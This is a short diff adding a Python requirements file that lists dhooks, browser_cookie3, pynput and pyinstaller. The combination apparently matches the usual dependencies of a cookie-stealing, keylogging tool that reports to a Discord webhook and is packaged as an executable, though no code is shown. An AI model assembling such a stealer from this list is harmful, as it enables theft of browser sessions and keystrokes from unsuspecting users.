@@ -1,0 +1,4 @@
+dhooks==1.1.4
+browser_cookie3==0.12.0
+pynput
+pyinstaller
